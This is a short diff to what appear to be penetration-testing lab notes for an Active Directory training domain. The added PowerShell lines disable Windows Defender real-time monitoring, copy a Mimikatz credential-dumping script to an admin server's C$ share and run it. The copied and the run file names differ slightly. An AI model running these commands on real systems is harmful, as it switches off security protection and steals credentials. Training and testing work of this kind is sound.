@@ -2635,6 +2635,8 @@ Get-MpPreference | findstr /I realtime
 ```
 $ExecutionContext.SessionState.LanguageMode
 Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
-
+Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
+Copy-Item .\Invoke-MimikatzEx.ps1 \\dcorpadminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
+.\InvokeMimikatzEx.ps1
 ```
 
